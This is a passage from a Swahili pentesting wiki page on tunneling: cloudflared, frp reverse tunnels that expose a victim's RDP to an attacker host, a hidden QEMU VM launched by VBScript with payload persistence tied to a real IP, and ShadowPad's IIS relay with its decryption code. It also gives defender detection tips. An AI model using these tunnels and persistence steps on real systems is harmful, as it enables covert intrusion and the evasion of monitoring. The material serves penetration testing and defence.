Bendera ya zamani `--socks5` huiambia `cloudflared` kwamba local origin huzungumza SOCKS5; haiundi local SOCKS5 listener. Kwa managed tunnel, `originRequest.proxyType: socks` husanidi ushughulikiaji wa SOCKS5 origin.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Tunnels zinazoendelea kwa DNS

Usanidi wa tunnel unaodhibitiwa ndani ya mfumo hutumia funguo za herufi ndogo `tunnel`, `credentials-file`, na `url` kama inavyoonyeshwa hapa chini.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anzisha kiunganishi:
```bash
cloudflared tunnel run mytunnel
```
Kiunganishi huanzisha miunganisho ya kutoka nje na, kwa chaguo-msingi, hujadiliana kuhusu QUIC huku kikiwa na fallback ya HTTP/2; usidhanie kwamba kila deployment hutumia TCP/443. Kiendeshe kwa privileges zinazohitajika tu na deployment yako.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse proxy ya Go inayotumia **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, na XTCP**. XTCP hutumia P2P hole punching, ambayo mafanikio yake hutegemea NAT. Kuanzia **v0.53.0**, inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo target host inaweza kutumia stock OpenSSH client bila binary ya `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Tunnel ya kawaida ya reverse TCP
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia gateway mpya ya SSH (bila binary ya frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri iliyo hapo juu inachapisha port **8080** ya victim kama **attacker_ip:9000** kwa kutumia stock OpenSSH client, huku `frps` ikitoa gateway.<sup>[[50]](#references)</sup>

## Tunnels za siri za VM kwa kutumia QEMU

QEMU user-mode networking haihitaji root au administrator privilege kwa virtual network, na `-netdev user,hostfwd=...` huelekeza miunganisho ya TCP, UDP, au UNIX kutoka kwa host kwenda kwa guest.<sup>[[51]](#references)</sup> TrustedSec iliandika kuhusu Tiny Core QEMU VM na reverse SSH tunnel iliyojaribiwa katika tukio ambalo EDR inayolenga host inaweza kukosa kuona shughuli ndani ya guest.<sup>[[1]](#references)</sup>

### One-liner ya haraka
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri iliyo hapo juu huanzisha guest ya **Tiny Core Linux** yenye 256 MiB za memory ya guest na disk image ya qcow2; disk image si disk ya in-RAM.
• Port **2222/tcp** kwenye Windows host inapelekwa kwa uwazi hadi **22/tcp** ndani ya guest.
• Kwa mtazamo wa mshambuliaji, target huonyesha tu port 2222; packet zozote zinazoifikia hushughulikiwa na SSH server inayoendesha kwenye VM.

### Kuanzisha kwa siri kupitia VBScript

TrustedSec iliona uzinduzi wa QEMU unaoendeshwa na VBS na Tiny Core images katika tukio d lililotajwa hapo juu.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Kuendesha script kwa `cscript.exe //B update.vbs` huweka dirisha limefichwa.<sup>[[1]](#references)</sup>

### Persistence ndani ya guest

Tukio la d linaeleza persistence katika Tiny Core guest isiyo na state kupitia `/opt/bootlocal.sh` na `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Weka payload kwenye `/opt/123.out`
2. Ongeza kwenye `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ipakwe kwenye `mydata.tgz` wakati wa kuzima.

### Mawazo kuhusu telemetry

• Host bado huonyesha mchakato wa QEMU, image ya qcow2, na listener yoyote iliyoforwardiwa na host.
• Scans za processes zinazofanywa kwenye host pekee huenda zisikague processes za guest, lakini virtualization si hakikisho la kuepuka detection; telemetry ya mtandao, QEMU, na image bado inaweza kuifichua.<sup>[[1]](#references)[[51]](#references)</sup>

### Vidokezo kwa Defender

• Toa alert kwa **binaries za QEMU/VirtualBox/KVM zisizotarajiwa** zilizo kwenye paths zinazoweza kuandikwa na mtumiaji.
• Zuia connections za nje zinazotoka kwenye `qemu-system*.exe`.
• Tafuta listening ports adimu (2222, 10022, …) zinazobind mara tu baada ya QEMU kuanzishwa.

## IIS/HTTP.sys relay nodes kupitia `HttpAddUrl` (ShadowPad)

Check Point inaeleza IIS module ya ShadowPad kama inayobadilisha web servers za perimeter zilizoathiriwa kuwa backdoor na relay nodes kwa kubind URL prefixes kupitia `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ripoti hiyo hiyo inaeleza defaults, wildcard listeners, packet decryption, relay queues, na debug telemetry zilizofupishwa hapa chini.<sup>[[3]](#references)</sup>

* **Config defaults** – ikiwa JSON config ya module haijumuishi values, inatumia IIS defaults zinazoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Kwa njia hiyo, traffic halali hujibiwa na IIS ikiwa na branding sahihi.
* **Wildcard interception** – operators hutoa list iliyotenganishwa kwa semicolon ya URL prefixes (wildcards katika host + path). Module huita `HttpAddUrl` kwa kila entry, hivyo HTTP.sys huelekeza requests zinazolingana kwa malicious handler; requests zisizolingana hurudi kwenye tabia ya kawaida ya IIS.
* **Encrypted first packet** – bytes mbili za kwanza za request body hubeba seed ya custom 32-bit PRNG. Kila byte inayofuata hufanyiwa XOR na keystream iliyozalishwa kabla ya protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module hudumisha lists mbili: “servers” (upstream nodes) na “clients” (downstream implants). Entries huondolewa ikiwa hakuna heartbeat ndani ya takriban sekunde 30. Lists zote mbili zikiwa si tupu, huunganisha server ya kwanza yenye afya na client ya kwanza yenye afya, kisha hupitisha bytes kati ya sockets zao hadi upande mmoja ufunge connection.
* **Debug telemetry** – logging ya hiari hurekodi source IP, destination IP, na jumla ya bytes zilizoforwardiwa kwa kila pairing. Investigators walitumia breadcrumbs hizo kujenga upya ShadowPad mesh iliyohusisha victims wengi.

---

## Tools nyingine za kuangalia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Kujificha kwenye Shadows: Covert Tunnels kupitia QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Kabla ya ToolShell: Kuchunguza Shughuli za Awali za Storm-2603 za Ransomware](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Relay Network na Utendaji wa Ndani wa Offensive Operation Isiyoonekana kwa Urahisi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Kupita Vizuizi vya Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Mwongozo wa ssh wa OpenBSD](https://man.openbsd.org/ssh)
- [7] [Mwongozo wa sshd_config wa OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Maelezo ya toleo la OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting katika Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Maelezo ya Metasploit socks_proxy module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Maelezo ya Metasploit autoroute module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Mwongozo wa socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Mwongozo wa PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Chaguo za command-line za PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Nyaraka za Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Mwongozo wa OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Utekelezaji na Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Muhtasari wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parameters za origin za Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Configuration file ya Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Run parameters za Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Nyaraka za networking za QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
